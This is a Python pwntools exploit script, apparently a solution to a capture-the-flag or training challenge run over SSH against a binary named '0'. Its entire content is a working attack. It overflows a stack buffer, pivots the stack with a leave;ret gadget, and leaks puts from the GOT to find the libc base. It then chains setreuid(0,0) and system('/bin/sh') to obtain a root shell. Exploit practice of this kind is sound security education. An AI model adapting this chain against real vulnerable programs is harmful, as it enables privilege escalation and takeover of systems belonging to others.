#!/usr/bin/env python

from pwn import *
import os

context.arch = "x86_64"
#context.log_level = 'debug'
get_flag = False
chall_name = '0'

def adjust_bytes_leaked_address(byte_address):
    bytearray_address = bytearray(byte_address)
    bytearray_address.reverse()
    address = int(bytearray_address.hex(), 16)
    return address

def get_libc_leaked_address(p_output):
    initial_string = b'Leaving!\n'
    initial_position = p_output.find(initial_string) + len(initial_string)
    final_position = p_output.find(b'\n', initial_position)
    libc_leak_bytes = p_output[initial_position:final_position]
    return adjust_bytes_leaked_address(libc_leak_bytes)

def run_with_gdb(p):
    gdb.attach(p,'''
    b *challenge+482
    b *_start+0''')

def run_exploit(p, debug, chall_path, overflow):
    if debug:
        run_with_gdb(p)

    p.recv(timeout=2).decode() # receiving the start message
    overflow_until_ret = b'A' * cyclic_find(0x6161616161616161, n=8)

    if overflow:
        overflow = cyclic(400, n=8)
        p.send(overflow)
        p.interactive()
        exit()
        
    binary = ELF(chall_path)
    rop = ROP(chall_path)

    #### STAGE 1 - Pivoting and Leaking PUTS LIBC $$$$$
    buffer_location = 0x4150e0

    # pivoting
    rop.raw(rop.rbp)
    rop.raw(buffer_location + 24)
    rop.raw(rop.find_gadget(["leave", "ret"]).address)
    # creating the chain to get a shell
    rop.raw(b'B'*8) # popping in RBP because leave
    rop.raw(rop.rdi)
    rop.raw(binary.got.puts)
    rop.raw(binary.plt.puts)
    rop.raw(binary.entrypoint)

    payload = overflow_until_ret + rop.chain()
    p.send(payload)

    process_output = p.recvuntil('\n###') # getting output until the restart of the binary
    print(process_output)
    puts_leaked_address = get_libc_leaked_address(process_output)

    ##### STAGE 2 - CALCULATING LIBC BASE AND FINDING SYSTEM #######
    # calculating and setting libc base
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    puts_libc_offset = libc.sym.puts
    print('Puts libc offset:', hex(puts_libc_offset))
    print('Leaked puts address:', hex(puts_leaked_address))
    print('Calculating libc base:', hex(puts_leaked_address), '-', hex(puts_libc_offset))
    libc_base = puts_leaked_address - puts_libc_offset
    libc.address = libc_base # setting the base on our ELF object

    # getting /bin/sh address
    bin_sh_libc = next(libc.search(b'/bin/sh'))
    print('/bin/sh libc address: ', hex(bin_sh_libc))
    print('Mouting rop chain to setreuid(0, 0) and system(\'/bin/sh\')...')

    #### STAGE 3 - Pivoting again and getting a shell #####
    rop = ROP(chall_path)
    # pivoting
    rop.raw(rop.rbp)
    rop.raw(buffer_location + 24)
    rop.raw(rop.find_gadget(["leave", "ret"]).address)
    # getting shell
    rop.raw(rop.ret.address)
    rop.call(libc.sym.setreuid, [0, 0])
    rop.call(libc.sym.system, [bin_sh_libc])
    rop.call(libc.sym.exit, [0]) # exit cleanly
    #rop.raw(rop.rdi.address)
    #rop.raw(p64(bin_sh_libc))
    #rop.raw(p64(system_address))
    print(rop.dump())
    print('Rop chain ready, press enter to pwn!')
    input()

    payload = overflow_until_ret + rop.chain()
    p.send(payload)

    p.clean()
    p.interactive()

if get_flag:
    ssh_connection = ssh(host='college',user='hacker')
    ssh_connection.set_working_directory(b'/home/hacker')

    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)

    run_exploit(p, False, chall_name, False)
    ssh_connection.close()
else:
    process_full_path = './' + chall_name
    p = process(process_full_path)
    run_exploit(p, False, process_full_path, False)
